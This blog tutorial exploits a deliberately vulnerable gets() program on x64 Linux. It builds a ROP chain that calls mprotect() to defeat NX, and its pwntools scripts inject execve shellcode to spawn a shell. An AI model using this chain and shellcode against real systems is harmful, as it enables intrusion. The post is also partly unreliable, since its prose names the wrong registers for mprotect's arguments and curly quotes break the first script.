---
layout: post
title:	"ELF x64 Bypass NX with mprotect()"
date:	2020-08-25
categories:
    - blog
tags:
    - binary
---


In this blogpost, I’ll explain how to bypass **NX** using **mprotect()** in order to make the stack executable.

For this purpose, I created the following vulnerable C program.

~~~
#include <stdio.h>

int main(int argc, char **argv){

    char input[256];
    gets(input);

    printf("%s", input);
    printf("\n");
    return 0;
}
~~~

This is the gcc command to compile the executable with **NX** enabled and **PIE** disabled.

~~~
gcc -o chall chall.c -fno-stack-protector -no-pie -Wl,-z,noexecstack
~~~

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img1.png)

**ASLR** should be disabled, how we can see **NX** is enabled.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img2.png)
![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img3.png)

Let’s run the executable in gdb. In order to trigger the buffer overflow we will give 300 ‘A’s as input.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img4.png)

as we expected, the **RBP** register is overwritten with our ‘A’s.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img5.png)

By using pattern_create, we can generate a payload in order to calculate the exact offset that overwrite the **RIP** register. Because the executable is a 64 bit ELF, the maximum address is **0x7FFFFFFFFFFFF**, we can overwrite the **RIP** register by adding 8 byte to the **RBP** register.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img6.png)

The **RBP** register is overwritten by the value **0x3769413669413569**.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img7.png)

Using pattern_offset, we can calculate the offset.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img8.png)

Because the executable is a 64 bit ELF, the maximum address is **0x7FFFFFFFFFFFF**, we can overwrite the **RIP** register by adding 8 byte to the **RBP** register and using the following value.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img9.png)

We successfully overwrite the **RIP** register with the value **0x0000424242424242**.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img10.png)

Because NX is enabled, our stack is not executable, we can use the **[mprotect()](https://www.man7.org/linux/man-pages/man2/mprotect.2.html)** function in order to make the stack executable.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img11.png)

as reported in the documentation:

~~~
mprotect() changes the access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.

If the calling process tries to access memory in a manner that violates the protections, then the kernel generates a SIGSEGV signal for the process.

prot is a combination of the following access flags: PROT_NONE or a bitwise-or of the other values in the following list: 

PROT_NONE: The memory cannot be accessed at all.

PROT_READ: The memory can be read.

PROT_WRITE: The memory can be modified.

PROT_EXEC: The memory can be executed.

...
~~~

We will set address to **0x7fffffffe000**, the value **0x1000** as length and the protection to **RWX**, which is **0x7**.

The calling convention for ELF 64 is the following: 
* Arguments in RDI, RSI, RDX, RCX, R8, R9 
* Return Value in RAX 

So we need to put the stack address in the **RDI** register, the length in the **RDX** register and the value **0x7** in the **RCX** register.

Using gdb, it is possible to find the **mprotect()** address.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img12.png)

Using ROPgadget, we can find the gadgets we need to put the values into the registers.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img13.png)

There is no “pop rdx” instruction in our binary, we can look for it into the libc.

Using the vmmap command, we can see the libc address.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img14.png)

And with ROPgadget, we can find the offset of the gadget.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img15.png)



Using the following exploit, we can use the “attach” command into gdb in order to debug the process and find our shellcode address.

~~~
from pwn import *
import struct

p = process("./chall")

libc_address = 0x00007ffff7df2000

payload = ""
payload += "A" * 264
payload += struct.pack("Q",0x00000000004011fb) # pop rdi ; ret
payload += struct.pack("Q",0x7fffffffe000) # stack address
payload += struct.pack("Q",0x00000000004011f9) # pop rsi ; pop r15 ; ret
payload += struct.pack("Q",0x1000) # size
payload += struct.pack("Q",0xAAAAAAAAAAAAAAAA) #garbage for r15
payload += struct.pack("Q",libc_address+0x000000000003fa6a) # pop rdx ; ret
payload += struct.pack("Q",0x7) #mode
payload += struct.pack("Q",0x7ffff7eea1e0) # mprotect address
payload += “B” * 8
payload += "C” * 200
raw_input()

p.sendline(payload)
p.readline()
p.interactive()
~~~

Let's run the script, use the command "attach 12889" in gdb and then let the execution continue.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img16.png)

As we can see, our ‘C’s start from **0x7fffffffe210**.
Let’s update our script with a shellcode and try to pop a bash shell, after the **mprotect()**, our stack will be executable.

~~~
from pwn import *
import struct

p = process("./chall")

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
libc_address = 0x00007ffff7df2000

payload = ""
payload += "A" * 264
payload += struct.pack("Q",0x00000000004011fb) # pop rdi ; ret
payload += struct.pack("Q",0x7fffffffe000) # stack address
payload += struct.pack("Q",0x00000000004011f9) # pop rsi ; pop r15 ; ret
payload += struct.pack("Q",0x1000) # size
payload += struct.pack("Q",0xAAAAAAAAAAAAAAAA) #garbage for r15
payload += struct.pack("Q",libc_address+0x000000000003fa6a) # pop rdx ; ret
payload += struct.pack("Q",0x7) #mode
payload += struct.pack("Q",0x7ffff7eea1e0) # mprotect address
payload += struct.pack("Q",0x7fffffffe210) # shellcode address
payload += shellcode

p.sendline(payload)
p.readline()
p.interactive()
~~~

And yes, it works.

![Screenshot]({{ site.baseurl }}/images/2020-08-25-elfx64-bypass-nx-with-mprotect/img17.png)

